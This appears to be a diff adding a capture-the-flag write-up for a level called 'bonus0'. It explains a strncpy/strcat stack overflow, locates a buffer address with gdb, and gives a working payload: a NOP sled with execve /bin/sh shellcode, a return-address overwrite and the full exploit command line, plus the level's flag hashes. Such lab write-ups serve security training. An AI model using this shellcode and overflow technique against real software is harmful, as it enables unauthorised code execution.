@@ -1,0 +1,53 @@
+bonus0 : f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+Process:
+    - We got a binaire that take two input and display it with a space between
+      - abc (first input)
+      - defhij (second input)
+      - output = abc defhij 
+    
+    - First we decompile the binaire and we see two function pp() and p()
+      this function use strcpy after a strncpy,
+      strcpy is vunelrable because the function read until a '\0'
+      but with strncpy(dest, src, 20(size)) we can copy a strings of 20 bytes without a NULL bytes.
+      So when the function strcpy() will copy
+      - strcpy(buffer[42], src(20 bytes without NULL bytes))
+      - in the memory that will look like this = [first input] [second input'\0']
+                                    strcpy(dest, [*************][*************'\0'])
+
+      After we see a strcat(buffer[41/42], second input) the overflow is here
+      strcat(buffer[41/42] + src[20] (second input)) = 61 bytes in total / 19 bytes of overflow
+    
+    - the goal here is to overflow the buffer[42] with the function strcat()
+      - buffer[42] = 
+        [20 bytes first input] +  \
+                                   }  strcpy()
+        [20 bytes second input] + /
+        [1 space] + 
+        [20 bytes second input]    } strcat()
+        = 61 bytes in total !
+
+      - [20 first][20 second][space][20 second][ebp save][eip]
+        ************[42]*************overflow **********target
+
+      - After test we found the offset a 9 bytes into the second input
+    
+    - the pp() use a buffer[4096], we can inject our shell code here.
+      - we need to get the adress of buffer[4096]
+      - gdb bonus0
+      - disas *p = 0x080484d0 <+28>	lea    eax,[ebp-0x1008] // BUFFER[4096]
+      - b  *p+28 / b *0x080484d0
+      - run
+      - x $ebp-0x1008 = 0xbfffe670	0x00000000 (this is the adress of the buffer)
+
+    - Start building our payload
+    - first input : python -c 'print("\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")'
+                                            100 NOP sled to the shell code
+    - second input : python -c 'print("A" * 9 + "\xe6\xe6\xff\xbf" + "B" * 7)'
+                                    A * 9 is the offset to the overflow
+                                    "\xe6\xe6\xff\xbf" is an adress betwen 0xbfffe670 + 100 NOP sled
+                                    B * 7 is the padding
+
+    - final : (python -c 'print("\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")';
+                    python -c 'print("A" * 9 + "\xe6\xe6\xff\xbf" + "A" * 7)'; cat) | ./bonus0
+
+    - Get the flag : cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
